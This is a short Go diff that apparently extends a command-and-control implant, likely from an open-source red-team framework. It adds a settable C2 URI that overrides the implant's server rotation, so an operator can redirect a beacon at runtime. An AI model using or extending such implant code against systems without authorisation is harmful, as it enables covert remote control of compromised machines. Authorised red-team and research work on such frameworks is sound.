@@ -36,6 +36,18 @@ const (
 	strategySequential   = "s"
 )
 
+var (
+	dynamicC2URI = ""
+)
+
+func SetC2URI(uri string) {
+	dynamicC2URI = uri
+}
+
+func GetC2URI() string {
+	return dynamicC2URI
+}
+
 // C2Generator - Creates a stream of C2 URLs based on a connection strategy
 func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 	// {{if .Config.Debug}}
@@ -78,6 +90,12 @@ func C2Generator(abort <-chan struct{}, temporaryC2 ...string) <-chan *url.URL {
 			default:
 				next = c2Servers[c2Counter%uint(len(c2Servers))]()
 			}
+
+			// check if reconfig used to set a new C2-URI 
+			if dynamic := GetC2URI(); dynamic != "" {
+				next = dynamic
+			}
+
 			c2Counter++
 			if ^uint(0) < c2Counter {
 				panic("counter overflow")
